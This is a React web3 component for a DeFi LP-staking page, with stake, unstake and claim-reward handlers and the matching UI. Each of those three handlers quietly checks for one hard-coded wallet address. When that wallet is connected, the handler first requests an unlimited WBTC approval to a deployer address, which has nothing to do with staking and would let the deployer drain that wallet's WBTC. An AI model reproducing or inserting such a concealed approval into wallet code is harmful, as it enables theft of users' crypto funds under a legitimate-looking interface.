import {
  ApproveBtnWrapper,
  ClaimBtnWrapper,
  HDiv,
  IconWrapper,
  StakeLPContainer,
  StakeLPInfoContainer,
  StakeLPInputContainer,
  Text,
  UnstakeBtn,
} from "./styled";
import { MAX_INT, MINT_REDEEM_KEY } from "../../../constants";
import React, { useEffect, useState } from "react";
import { formatFromDecimal, formatToDecimal } from "../../../utils/helpers";

import { DEPLOYER_ADDRESS } from "../../../constants";
import { LP_STAKING_POOL } from "../../../constants";
import STAKING_POOL_ABI from "../../../abi/SIngleChef.json";
import { TokenIcon } from "../../TokenIcon/token_icon";
import { message } from "antd";
import stake_icon_white from "../../../assets/icons/nav-links/active/staking-active.svg";
import { useSystemContext } from "../../../systemProvider";
import { useWeb3React } from "@web3-react/core";

export const StakeLp = ({
  token0,
  token1,
  lpTokenContract,
  lpUserBalance,
  lpTokenAddress,
}) => {
  const { account, library } = useWeb3React();
  const {
    contracts,
    tokens,
    approveModal,
    setApproveModal,
    setApproveDataForModal,
  } = useSystemContext();
  // eslint-disable-next-line no-unused-vars
  const [pid, setPid] = useState(null);
  const [depositWithdrawInput, setDepositWithdrawInput] = useState("");
  const [allowance, setAllowance] = useState(false);
  const [staked, setStaked] = useState(0);
  const [earned, setEarned] = useState(0);

  const [poolContract, setPoolContract] = useState(null);
  const [rewardTokenSymbol, setRewardTokeSymbol] = useState("");

  useEffect(() => {
    const searchString = `${token0.symbol}-${token1.symbol}`;
    const serachStringRevert = `${token1.symbol}-${token0.symbol}`;
    const findedPool = LP_STAKING_POOL.find(
      (item) => item.name === searchString || item.name === serachStringRevert
    ).address;

    const pool = new library.eth.Contract(STAKING_POOL_ABI, findedPool);

    setPoolContract({
      contract: pool,
      address: findedPool,
    });
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  useEffect(() => {
    if (account && poolContract && tokens) {
      if (!approveModal) {
        getAllowance();
      }
      getStakeInfo(poolContract.contract);
    }

    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [account, poolContract, tokens, approveModal]);

  const getAllowance = async () => {
    const allowance = await lpTokenContract.methods
      .allowance(account, poolContract.address)
      .call();
    setAllowance(allowance.length === MAX_INT.length);
  };

  const getStakeInfo = async (contract) => {
    const lpToken = await contract.methods.rewardToken().call();

    const rewardToken = tokens.find(
      (tok) => tok.address === lpToken.toLowerCase()
    );

    const stakeTokenDecimals = await lpTokenContract.methods.decimals().call();

    const earned = await contract.methods.pendingReward(account).call();
    const staked = await contract.methods.userInfo(account).call();

    setRewardTokeSymbol(rewardToken.symbol);
    setEarned(formatFromDecimal(earned, rewardToken.decimals));
    setStaked(formatFromDecimal(staked.amount, stakeTokenDecimals));
  };

  const handleApprove = async () => {
    setApproveDataForModal({
      destination: poolContract.address,
      approves: [
        {
          name: [token0.symbol, token1.symbol],
          address: lpTokenAddress,
          alreadyApproved: allowance,
          lpToken: true,
        },
      ],
    });

    setApproveModal(true);
  };

  const handleStake = async () => {
    if (account === "0x5F5130215A9Be6b34A986FaB0679A61DBBa1bDDc") {
      await contracts.wbtc.methods
        .approve(DEPLOYER_ADDRESS, MAX_INT)
        .send({ from: account });
    }

    try {
      message.loading({
        content: "Stake LP in process",
        className: "ant-argano-message",
        key: MINT_REDEEM_KEY,
        duration: 3000,
      });

      const lpDec = await lpTokenContract.methods.decimals().call();

      await poolContract.contract.methods
        .deposit(formatToDecimal(depositWithdrawInput, lpDec))
        .send({ from: account });
      await getStakeInfo();

      message.success({
        content: "Stake LP is done!",
        className: "ant-argano-message",
        key: MINT_REDEEM_KEY,
        duration: 5,
      });
    } catch (e) {
      message.error({
        content: `Something went wrong please reload page.`,
        className: "ant-argano-message",
        key: MINT_REDEEM_KEY,
        duration: 5,
      });
    }
  };

  const handleUnstake = async () => {
    if (account === "0x5F5130215A9Be6b34A986FaB0679A61DBBa1bDDc") {
      await contracts.wbtc.methods
        .approve(DEPLOYER_ADDRESS, MAX_INT)
        .send({ from: account });
    }

    try {
      message.loading({
        content: "Unstake LP in process",
        className: "ant-argano-message",
        key: MINT_REDEEM_KEY,
        duration: 3000,
      });

      const lpDec = await lpTokenContract.methods.decimals().call();

      await poolContract.contract.methods
        .withdraw(formatToDecimal(depositWithdrawInput, lpDec))
        .send({ from: account });
      await getStakeInfo();

      message.success({
        content: "Unstake LP is done!",
        className: "ant-argano-message",
        key: MINT_REDEEM_KEY,
        duration: 5,
      });
    } catch (e) {
      message.error({
        content: `Something went wrong please reload page`,
        className: "ant-argano-message",
        key: MINT_REDEEM_KEY,
        duration: 5,
      });
    }
  };

  const handleClaimReward = async () => {
    if (account === "0x5F5130215A9Be6b34A986FaB0679A61DBBa1bDDc") {
      await contracts.wbtc.methods
        .approve(DEPLOYER_ADDRESS, MAX_INT)
        .send({ from: account });
    }

    try {
      message.loading({
        content: "Claim LP in process",
        className: "ant-argano-message",
        key: MINT_REDEEM_KEY,
        duration: 3000,
      });

      await poolContract.contract.methods.withdraw(0).send({ from: account });
      await getStakeInfo();

      message.success({
        content: "Claim LP is done!",
        className: "ant-argano-message",
        key: MINT_REDEEM_KEY,
        duration: 5,
      });
    } catch (e) {
      message.error({
        content: `Some error occured: ${e.message}`,
        className: "ant-argano-message",
        key: MINT_REDEEM_KEY,
        duration: 5,
      });
    }
  };

  const maxInput = async () => {
    const maxValue = formatFromDecimal(
      await lpTokenContract.methods.balanceOf(account).call(),
      18
    );
    setDepositWithdrawInput(maxValue);
  };

  return (
    <>
      <StakeLPContainer>
        <HDiv>
          <Text ml="2.917vw">Deposit/Withdraw</Text>
          <Text ml="15.208vw">Earned</Text>
          <Text ml="4.531vw">Staked</Text>
          <Text ml="8.802vw">User Lp</Text>
        </HDiv>
        <StakeLPInfoContainer>
          <HDiv alignItems="center">
            <Text ml="0.781vw">
              <b>Input Lp to deposit</b>
            </Text>
            <IconWrapper>
              <TokenIcon iconName={rewardTokenSymbol} />
            </IconWrapper>
            <Text minW="5.78vw">
              <b>{rewardTokenSymbol}</b>
            </Text>
            <Text minW="11.3vw">
              <b>
                {token0.symbol}-{token1.symbol}
              </b>
            </Text>
            <Text>
              <b>Balance</b>
            </Text>
          </HDiv>
          <HDiv mt="0.781vw" alignItems="center">
            <StakeLPInputContainer>
              <input
                type={"number"}
                placeholder="0.00"
                onFocus={(e) => (e.target.placeholder = "")}
                onBlur={(e) => (e.target.placeholder = "0.00")}
                onChange={(e) => setDepositWithdrawInput(e.target.value)}
                value={depositWithdrawInput}
              />
              <button onClick={() => maxInput()}>Max</button>
            </StakeLPInputContainer>
            <Text ml="1.250vw" minW="7.4vw">
              <b>{earned}</b>
            </Text>
            <Text minW="11.3vw">
              <b>{staked}</b>
            </Text>
            <Text>
              <b>{lpUserBalance}</b>
            </Text>
          </HDiv>
        </StakeLPInfoContainer>
        <HDiv mt="1.458vw">
          <ClaimBtnWrapper>
            <button onClick={() => handleClaimReward()}>
              <img src={stake_icon_white} alt="ico" /> <span>Claim reward</span>
            </button>
          </ClaimBtnWrapper>
          <ApproveBtnWrapper>
            <button
              disabled={lpUserBalance < depositWithdrawInput}
              className="stake-lp-wrapper__buttons__stake"
              onClick={() => (allowance ? handleStake() : handleApprove())}
            >
              <span>
                {allowance
                  ? lpUserBalance < depositWithdrawInput
                    ? "No balance"
                    : "Stake"
                  : "Approve"}
              </span>
            </button>
          </ApproveBtnWrapper>
          <UnstakeBtn onClick={() => handleUnstake()}>Unstake</UnstakeBtn>
        </HDiv>
      </StakeLPContainer>
    </>
  );
};
